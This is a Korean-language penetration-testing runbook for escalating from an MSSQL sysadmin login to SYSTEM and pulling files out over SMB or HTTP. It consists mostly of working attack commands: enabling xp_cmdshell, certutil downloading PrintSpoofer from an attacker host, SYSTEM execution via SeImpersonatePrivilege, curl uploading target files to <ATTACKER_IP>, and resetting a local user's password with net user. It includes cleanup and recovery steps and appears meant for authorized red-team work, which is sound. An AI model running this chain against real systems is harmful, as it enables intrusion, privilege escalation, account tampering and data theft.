---
tags:
  - 환경/windows
  - 서비스/mssql
  - 서비스/smb
  - 기능/권한상승
시작상태:
  - Windows MSSQL 서비스의 유효한 로그인 자격 증명 확보
  - Linux 공격 호스트에서 대상 MSSQL 포트 접근 가능
목표:
  - SQL Server 서비스 계정의 운영체제 명령 실행
  - SeImpersonatePrivilege를 이용한 SYSTEM 명령 실행
  - 지정한 Windows 파일을 SMB로 공격 호스트에 회수
필요권한:
  - MSSQL sysadmin 또는 xp_cmdshell 실행 권한
  - SQL Server 서비스 계정 token의 SeImpersonatePrivilege
  - 파일을 읽을 로컬 계정의 SMB 공유 권한
필요정보:
  - MSSQL 대상과 인스턴스
  - 공격 호스트 HTTP 주소와 포트
  - 회수할 Windows 파일 경로
네트워크위치:
  - Linux 공격 호스트에서 MSSQL과 SMB에 직접 또는 피벗 경유 접근
---

# MSSQL sysadmin에서 SYSTEM 권한과 SMB 파일 회수까지

## 시나리오 개요

유효한 MSSQL 로그인으로 서버 역할을 확인하고 `xp_cmdshell`에서 SQL Server 서비스 계정과 `SeImpersonatePrivilege`를 식별한다. HTTP로 PrintSpoofer를 반입해 SYSTEM 명령 실행을 검증한 뒤, 먼저 HTTP 직접 회수 또는 이미 보유한 SMB 자격 증명을 선택한다. 로컬 사용자 비밀번호 재설정은 두 경로가 불가능할 때만 마지막으로 사용한다.

> 로컬 비밀번호 변경은 서비스·예약 작업·자동 로그온을 끊을 수 있으며 원래 비밀번호를 모르면 자동 원복할 수 없다. 파일 회수와 계정 변경은 별도 완료 상태로 기록한다.

## 기준 구조

```text
Linux 공격 호스트
  -> MSSQL/TDS
    -> SQL Server 서비스 계정의 xp_cmdshell
      -> HTTP로 PrintSpoofer 반입
        -> SYSTEM 명령 실행
          -> HTTP 직접 회수 또는 기존 SMB 자격 증명
            -> (마지막 수단) 임시 비밀번호 재설정 후 SMB C$ 회수
```

## 시작 상태

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| MSSQL 경로 | 대상 TDS 포트에 연결 가능 | `impacket-mssqlclient` 연결 | 인스턴스·포트·피벗·TLS 확인 |
| MSSQL 자격 증명 | SQL 또는 Windows 인증 성공 | `SELECT SYSTEM_USER` | 인증 방식과 계정 표기 확인 |
| 서버 역할 | `sysadmin = 1` 또는 기존 `xp_cmdshell` 실행 권한 | `IS_SRVROLEMEMBER` | [[MSSQL Impersonation 권한 상승]], linked server 확인 |
| 파일 전송 | SQL 호스트에서 공격 호스트 HTTP 포트 연결 가능 | 실제 `certutil` 요청 | listener bind·route·방화벽 확인 |
| SMB 회수 | 공격 호스트에서 SQL 호스트 445/TCP 접근 가능 | SMB 협상 | 피벗·SOCKS와 route 확인 |

`<SQL_TARGET>`은 SQL Server FQDN 또는 IP(예: `192.0.2.20`)이고 `<DOMAIN>/<SQL_USER>`는 실제 인증한 SQL 또는 AD 주체다. `<ATTACKER_IP>:<HTTP_PORT>`는 SQL 호스트에서 도달하는 Linux 수신 주소(예: `192.0.2.10:8080`)이며, `<PRINTSPOOFER_PATH>`는 대상에서 작업 전 없었던 절대 경로(예: `C:\\Windows\\Temp\\PrintSpoofer-p03.exe`)다. `<REMOTE_FILE>`·`<REMOTE_PATH>`는 SQL 호스트 기준 원격 파일 경로, `<LOCAL_FILE>`은 Linux 공격 호스트의 새 수신 경로다. `<HTTP_SERVER_PID>`는 Python server 시작 직후 `ps` 출력에서 얻는다.

## 공격 경로 요약

| 단계 | 실행 위치 | 수행할 행동 | 확인할 출력·상태 | 다음 단계 |
|---|---|---|---|---|
| 1 | Linux 공격 호스트 | [[DB 인증과 데이터 열거]] | MSSQL login과 `sysadmin` 여부 | xp_cmdshell 실행 |
| 2 | MSSQL 프롬프트 | [[MSSQL xp_cmdshell 명령 실행]] | SQL Server 서비스 계정과 `SeImpersonatePrivilege Enabled` | PrintSpoofer 반입 |
| 3 | Linux 공격 호스트와 MSSQL 프롬프트 | [[Certutil로 Windows HTTP 파일 반입]] | HTTP GET과 대상 파일 생성 | SYSTEM 검증 |
| 4 | MSSQL 프롬프트 | [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]] | `CreateProcessAsUser() OK`, `nt authority\system` | 회수 경로 선택 |
| 5 | SYSTEM 명령 실행 | HTTP 직접 회수 또는 기존 SMB 인증을 먼저 검증 | 수신 HTTP 요청 또는 기존 계정의 share 접근 | 필요할 때만 비밀번호 변경 검토 |
| 6 | SYSTEM 명령 실행 | [[로컬 사용자 비밀번호 재설정]] | 임시 로컬 비밀번호와 인증 성공 | 두 안전 경로가 불가하고 변경이 정당화된 경우만 SMB 회수 |
| 7 | Linux 공격 호스트 | [[SMB 인증 공유 파일 수집]] | `getting file`과 로컬 파일 | 내용 확인 후 복구 |

## 1. MSSQL 인증과 서버 역할 확인

`<DOMAIN>`은 SQL 로그인이 속한 AD DNS 또는 NetBIOS 도메인, `<SQL_USER>`는 그 로그인 계정명, `<PASSWORD>`는 해당 계정의 평문 비밀번호, `<SQL_TARGET>`은 Linux 공격 호스트에서 도달 가능한 SQL Server FQDN 또는 IP다. 예시는 `example.test/sqlreader:<PASSWORD>@192.0.2.20` 형식이며 이 명령은 Linux 공격 호스트에서 실행한다.

```bash
impacket-mssqlclient '<DOMAIN>/<SQL_USER>:<PASSWORD>@<SQL_TARGET>' -windows-auth
```

```sql
SQL> SELECT SYSTEM_USER;
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
```

`IS_SRVROLEMEMBER`가 `1`이면 MSSQL 서버 설정 변경 후보임을 확인한 것이다. Windows 로컬 관리자나 SYSTEM 권한은 아직 확인되지 않았다.

## 2. xp_cmdshell 실행 계정과 특권 확인

`impacket-mssqlclient`의 `SQL>` 프롬프트에서는 셸 명령 뒤에 Windows 명령을 따옴표 없이 입력한다.

먼저 두 설정의 `value_in_use`를 기록한다. `enable_xp_cmdshell`로 바뀐 설정만 나중에 원래 값으로 되돌린다.

```sql
SQL> SELECT name, value, value_in_use FROM sys.configurations WHERE name IN ('show advanced options','xp_cmdshell');
```

```text
SQL> enable_xp_cmdshell
SQL> xp_cmdshell hostname
SQL> xp_cmdshell whoami
SQL> xp_cmdshell whoami /priv
```

`hostname`과 서비스 계정을 기록한다. `SeImpersonatePrivilege Enabled`는 다음 기법의 전제일 뿐 SYSTEM 실행 성공은 아니다.

## 3. PrintSpoofer 반입

Linux 공격 호스트에서 HTTP 서버를 연다.

`<SERVE_DIRECTORY>`는 Linux 공격 호스트에서 `PrintSpoofer64.exe`를 둔 절대 디렉터리(예: `/tmp/p03-serve`)이고, `<ATTACKER_IP>:<HTTP_PORT>`는 SQL 호스트에서 도달 가능한 bind 주소·포트다. `<PRINTSPOOFER_PATH>`는 SQL 호스트에서 작업 전 없었던 절대 파일 경로를 그대로 재사용한다.

```bash
cd <SERVE_DIRECTORY>
ss -ltnp | grep -E '[:.]<HTTP_PORT>[[:space:]]'
python3 -m http.server <HTTP_PORT> --bind <ATTACKER_IP> &
HTTP_SERVER_PID=$!
ps -p "$HTTP_SERVER_PID" -o pid=,args=
```

MSSQL 프롬프트에서 대상 파일을 내려받는다.

```text
SQL> xp_cmdshell if exist "<PRINTSPOOFER_PATH>" (echo EXISTS) else (echo ABSENT)
SQL> xp_cmdshell certutil.exe -f -urlcache -split http://<ATTACKER_IP>:<HTTP_PORT>/PrintSpoofer64.exe <PRINTSPOOFER_PATH>
```

작업 전 `ABSENT`인 고유한 `<PRINTSPOOFER_PATH>`만 사용한다. HTTP 로그의 GET, CertUtil 완료 메시지와 대상 경로의 파일 생성을 확인한다. 손상 진단이 필요하고 신뢰할 기준값이 있을 때만 연결된 파일 반입 절차에서 비교한다.

## 4. SYSTEM 명령 실행 검증

```text
SQL> xp_cmdshell <PRINTSPOOFER_PATH> -c "cmd /c whoami"
```

`Found privilege: SeImpersonatePrivilege`, `CreateProcessAsUser() OK`와 `nt authority\system`이 함께 있어야 성공이다.

## 5. 회수 경로를 먼저 선택

SYSTEM 명령으로 읽을 수 있는 지정 파일은 먼저 공격 호스트의 HTTP 수신기로 직접 회수한다. 대상에서 공격 호스트로 나가는 HTTP가 가능하다는 것은 도구 반입 단계에서 이미 확인했으므로, 추가 계정 변경 없이 같은 경로를 재사용할 수 있다.

`<REMOTE_FILE>`는 SQL 호스트에서 SYSTEM이 읽을 수 있는 절대 파일 경로, `<COLLECTION_PATH>`는 HTTP `PUT` 수신기가 저장하도록 정한 URL 상대 경로다. SMB 대안의 `<SHARE>`·`<REMOTE_PATH>`는 SQL 호스트의 실제 공유와 공유 기준 경로, `<LOCAL_FILE>`은 Linux 공격 호스트의 새 수신 경로이며 `<EXISTING_USER>`·`<EXISTING_PASSWORD>`는 이미 보유한 SMB 계정 자료다.

```text
SQL> xp_cmdshell <PRINTSPOOFER_PATH> -c "cmd /c curl.exe --upload-file <REMOTE_FILE> http://<ATTACKER_IP>:<HTTP_PORT>/<COLLECTION_PATH>"
```

이 명령은 공격 호스트의 수신 endpoint가 HTTP `PUT` 업로드를 지원할 때만 사용한다. 단순 `python3 -m http.server`는 파일 수신을 지원하지 않는다. 수신 endpoint가 없으면 파일 읽기 성공만 확인하고, 기존에 보유한 SMB 자격 증명과 공유 권한을 먼저 검증한다.

```bash
smbclient //<SQL_TARGET>/<SHARE> -W <WORKGROUP_OR_DOMAIN> -U '<EXISTING_USER>%<EXISTING_PASSWORD>' -c 'get <REMOTE_PATH> <LOCAL_FILE>'
```

`getting file`은 share 접근과 해당 파일 READ가 모두 성공했음을 뜻한다. 인증 성공만으로 `C$` 접근이나 파일 READ를 단정하지 않는다.

## 6. 마지막 수단: 로컬 사용자 비밀번호 재설정

SYSTEM 명령은 확보했지만 HTTP 직접 회수와 기존 SMB 자격 증명 경로가 모두 불가능할 때만 수행한다.

`<LOCAL_USER>`는 SQL 호스트의 로컬 SAM 계정명이고, `<TEMP_PASSWORD>`는 이번 인증에만 사용할 새 비밀번호다. 변경 전 해당 계정에 연결된 서비스·예약 작업·자동 로그온과 현재 인증 상태를 기록한다. `<ORIGINAL_PASSWORD>`는 실제로 알고 있고 정책상 재사용 가능한 경우에만 복구 단계에서 사용하며, 모르면 자동 원복하지 않고 `복구 미완료(원래 비밀번호 미확인)`로 남긴다.

```text
SQL> xp_cmdshell <PRINTSPOOFER_PATH> -c "cmd /c net user <LOCAL_USER> <TEMP_PASSWORD>"
```

`The command completed successfully.`는 로컬 SAM 비밀번호 변경 완료다. 도메인 계정 비밀번호 변경으로 해석하지 않는다.

## 7. 변경한 자격 증명으로 SMB 회수

```bash
smbclient //<SQL_TARGET>/C$ -W WORKGROUP -U '<LOCAL_USER>%<TEMP_PASSWORD>' -c 'cd Users\<TARGET_USER>\Desktop; get <REMOTE_FILE> <LOCAL_FILE>'
```

`getting file`과 공격 호스트의 `<LOCAL_FILE>`을 확인한다. 로그인 성공, `C$` 접속과 파일 `get`은 서로 다른 성공 단계다.

## 실패 시 분기

| 실패 지점·출력 | 먼저 확인할 것 | 다음 경로 |
|---|---|---|
| MSSQL login 실패 | SQL·Windows 인증 방식, 인스턴스·포트 | [[MSSQL 서비스]] |
| `enable_xp_cmdshell` 거부 | 현재 login의 `sysadmin`, IMPERSONATE·linked server | [[MSSQL Impersonation 권한 상승]] 또는 [[MSSQL Linked Server 내부 이동]] |
| `SeImpersonatePrivilege` 없음·Disabled | 현재 OS 계정과 프로세스 액세스 토큰 | [[Windows 권한 상승 열거]] |
| HTTP GET 없음 | listener bind, 공격 호스트 주소·포트와 egress | [[상황별 파일 전송]] |
| PrintSpoofer 프로세스 생성 실패 | build·arch·impersonation/primary 액세스 토큰 단계·실행 차단 | [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]]의 오류 단계 확인 |
| HTTP 직접 회수 불가 | 수신 서버의 파일 수신 지원과 egress 정책 | 기존 SMB 자격 증명 또는 다른 회수 경로 확인 |
| SMB timeout | 피벗·SOCKS·445/TCP route | [[내부망 경로 확보 후 피벗 구성]] |
| SMB 인증 성공 후 `C$` 거부 | 로컬 관리자 멤버십·UAC 원격 제한·share ACL | 일반 공유 또는 다른 파일 회수 경로 확인 |

## 변경 영향과 복구

SQL 연결과 SYSTEM 명령 경로가 살아 있을 때 대상 계정·파일·cache·설정을 먼저 처리하고, 마지막에 공격 호스트 listener와 SQL 연결을 닫는다. 선택하지 않은 회수 분기의 자원은 만들거나 삭제하지 않는다.

### 1. 파일 회수 결과와 로컬 비밀번호 상태 확정

`smbclient`와 HTTP 업로드 연결을 먼저 종료하고 공격 호스트의 exact `<LOCAL_FILE>` 또는 수신 파일의 경로·내용을 확인한다. 이는 공격 목표의 결과물이므로 자동 삭제하지 않고 Vault 밖의 보존·폐기 상태를 기록한다.

로컬 비밀번호를 변경했다면 PrintSpoofer와 SQL 연결이 살아 있을 때 [[로컬 사용자 비밀번호 재설정]]의 기준으로 먼저 처리한다.

```text
SQL> xp_cmdshell <PRINTSPOOFER_PATH> -c "cmd /c net user <LOCAL_USER> <ORIGINAL_PASSWORD>"
SQL> xp_cmdshell net user <LOCAL_USER>
```

원래 비밀번호를 알고 정책상 재사용할 수 있는 경우에만 첫 명령을 실행한다. 명령 성공과 대상 인증을 따로 확인한다. 원래 값을 모르면 자동 원복할 수 없으며 `복구 미완료(원래 비밀번호 미확인)`로 기록한다. 관리자가 새 비밀번호를 설정하고 서비스·예약 작업·자동 로그온 갱신과 정상 동작을 확인하기 전에는 복구 완료로 올리지 않는다.

### 2. PrintSpoofer 파일과 certutil cache 정리

작업 전 없었던 exact 파일과 이번 다운로드 URL의 cache 항목만 처리한다.

```text
SQL> xp_cmdshell certutil.exe -urlcache http://<ATTACKER_IP>:<HTTP_PORT>/PrintSpoofer64.exe delete
SQL> xp_cmdshell del "<PRINTSPOOFER_PATH>"
SQL> xp_cmdshell if exist "<PRINTSPOOFER_PATH>" (echo EXISTS) else (echo ABSENT)
```

마지막 출력이 `ABSENT`여야 파일 정리가 끝난 것이다. 삭제 실패 시 파일을 사용하는 프로세스, SQL Server service account의 삭제 권한과 방어 제품 격리 상태를 먼저 확인한다. 이름이 비슷한 Temp 파일을 일괄 삭제하지 않는다.

### 3. MSSQL 설정 복원

같은 SQL session에서 [[MSSQL xp_cmdshell 명령 실행]]의 절차로 변경 전 `value_in_use`가 `0`이었던 설정만 되돌린다. `show advanced options`가 원래 `1`이면 `xp_cmdshell`만 비활성화한다. 복원 뒤 두 값을 다시 조회해 기준선과 대조한다.

```sql
SQL> SELECT name, value, value_in_use FROM sys.configurations WHERE name IN ('show advanced options','xp_cmdshell');
```

query를 확인하기 전에 SQL 연결이 끊기면 설정 복구는 미확인 상태다.

### 4. 공격 호스트 listener와 연결 종료

대상 측 정리가 끝난 뒤 기록한 Python HTTP server PID만 종료하고 포트가 작업 전 상태로 돌아왔는지 확인한다.

```bash
ps -p <HTTP_SERVER_PID> -o pid=,args=
kill <HTTP_SERVER_PID>
ps -p <HTTP_SERVER_PID> -o pid=,args=
ss -ltnp | grep -E '[:.]<HTTP_PORT>[[:space:]]'
```

HTTP `PUT` 수신기를 별도로 사용했다면 그 실행에서 기록한 exact listener ID·PID로 같은 순서로 종료한다. 마지막에 `impacket-mssqlclient`를 종료한다. listener나 SQL 연결을 먼저 닫아 대상 파일·비밀번호·설정을 확인하지 못했으면 전체 복구 완료로 기록하지 않는다.

## 완료 기준

### 공격 목표

- MSSQL login·DB 역할과 Windows 실행 계정을 구분했다.
- PrintSpoofer 자식 명령에서 `nt authority\system`을 확인했다.
- HTTP 직접 회수, 기존 SMB 인증 또는 임시 비밀번호 변경 중 선택한 경로로 지정 파일을 공격 호스트에 회수하고 경로·내용을 확인했다.

### 복구 상태

- `완료`: 로컬 비밀번호 변경 분기를 사용하지 않았고, PrintSpoofer 파일·certutil cache, MSSQL 설정, HTTP listener를 기준선과 대조했다.
- `제한적`: 비밀번호를 한 번이라도 변경했거나 이미 끊긴 세션·감사 기록 또는 보존 중인 민감 회수 파일이 있으며 담당자·보존 위치·후속 조치가 확인됐다. 원래 평문으로 다시 설정했더라도 비밀번호 이력, 기존 세션과 감사 기록은 되돌릴 수 없으므로 `완료`로 올리지 않는다.
- `미확인`: SQL 또는 SYSTEM 경로가 먼저 끊겨 대상 파일·비밀번호·설정 중 하나라도 확인하지 못했다. 파일 회수에 성공했더라도 복구 완료로 쓰지 않는다.


## 참고 링크
- [Microsoft: xp_cmdshell](https://learn.microsoft.com/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16), [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer), [Microsoft: curl](https://learn.microsoft.com/windows-server/administration/windows-commands/curl)
## 관련 도구

- [[impacket-mssqlclient]]
- [[PrintSpoofer]]
- [[smbclient]]
